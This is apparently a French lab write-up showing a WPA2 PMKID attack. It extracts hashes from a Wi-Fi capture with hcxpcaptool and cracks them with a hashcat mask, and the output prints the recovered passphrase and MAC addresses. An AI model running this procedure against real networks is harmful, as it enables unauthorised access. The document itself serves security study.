## Attaque Hashcat
En premier, on extrait les infos du fichier pcap grâce à hcxpcaptool :

```
(base) root@basile-n73jf-2:~/hcxtools# ./hcxpcaptool -z PMKID_handshake.16800 ../PMKID_handshake.pcap

reading from PMKID_handshake.pcap
failed to read packet 1006 (packet len 313 != incl len 422   

summary capture file:                           
---------------------
file name........................: PMKID_handshake.pcap
file type........................: pcap 2.4
file hardware information........: unknown
capture device vendor information: 000000
file os information..............: unknown
file application information.....: unknown (no custom options)
network type.....................: DLT_IEEE802_11_RADIO (127)
endianness.......................: little endian
read errors......................: yes
minimum time stamp...............: 23.04.2020 10:25:07 (GMT)
maximum time stamp...............: 23.04.2020 10:25:44 (GMT)
packets inside...................: 1006
skipped damaged packets..........: 0
packets with GPS NMEA data.......: 0
packets with GPS data (JSON old).: 0
packets with FCS.................: 1006
beacons (total)..................: 495
beacons (WPS info inside)........: 250
beacons (device info inside).....: 250
probe requests...................: 30
probe responses..................: 52
association requests.............: 2
association responses............: 5
authentications (OPEN SYSTEM)....: 4
authentications (BROADCOM).......: 2
authentications (APPLE)..........: 2
deauthentications................: 14
disassociations..................: 1
action packets...................: 1
EAPOL packets (total)............: 68
EAPOL packets (WPA2).............: 68
PMKIDs (not zeroed - total)......: 2
PMKIDs (WPA2)....................: 55
PMKIDs from access points........: 2
best handshakes (total)..........: 2 (ap-less: 0)
best PMKIDs (total)..............: 2

summary output file(s):
-----------------------
2 PMKID(s) written to PMKID_handshake.16800
```
Ensuite, on utilise hashcat avec un masque aproprié (ici, 5 minuscules, et 3 chiffres) :

```
(base) root@basile-n73jf-2:~/hashcat# ./hashcat -m 16800 PMKID_handshake.16800 -a 3 -w 3 '?l?l?l?l?l?d?d?d' --force
hashcat (v5.1.0-1789-gc7da6357) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.3 None+Asserts, LLVM 6.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5 CPU       M 480  @ 2.67GHz, 5664/5728 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Applicable optimizers:
* Zero-Byte
* Single-Salt
* Brute-Force
* Slow-Hash-SIMD-LOOP

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Name........: WPA-PMKID-PBKDF2
Hash.Target......: ../hcxtools/test.16800
Time.Started.....: Sun May  3 16:29:54 2020, (20 secs)
Time.Estimated...: Tue Jul  7 19:37:54 2020, (65 days, 3 hours)
Guess.Mask.......: ?l?l?l?l?l?d?d?d [8]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2111 H/s (60.20ms) @ Accel:128 Loops:1024 Thr:1 Vec:4
Recovered........: 0/2 (0.00%) Digests
Progress.........: 41472/11881376000 (0.00%)
Rejected.........: 0/41472 (0.00%)
Restore.Point....: 1536/456976000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:3-4 Iteration:1024-2048
Candidates.#1....: beele123 -> bjate123

904d4add4b94:90dd5d95bc14:Sunrise_2.4GHz_DD4B90:admin123
904d4add4b94:e4b2fb4bc169:Sunrise_2.4GHz_DD4B90:admin123

Session..........: hashcat
Status...........: Cracked
Hash.Name........: WPA-PMKID-PBKDF2
Hash.Target......: ../hcxtools/test.16800
Time.Started.....: Sun May  3 16:29:54 2020, (4 mins, 16 secs)
Time.Estimated...: Sun May  3 16:34:10 2020, (0 secs)
Guess.Mask.......: ?l?l?l?l?l?d?d?d [8]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1885 H/s (67.85ms) @ Accel:128 Loops:1024 Thr:1 Vec:4
Recovered........: 2/2 (100.00%) Digests
Progress.........: 481792/11881376000 (0.00%)
Rejected.........: 0/481792 (0.00%)
Restore.Point....: 18432/456976000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:4-5 Iteration:1-3
Candidates.#1....: axona123 -> aweli123

Started: Sun May  3 16:29:51 2020
Stopped: Sun May  3 16:34:11 2020

```

Les résultats obtenus sont stockés dans le fichier hashcat.potfile au bout de 5 minutes environ.
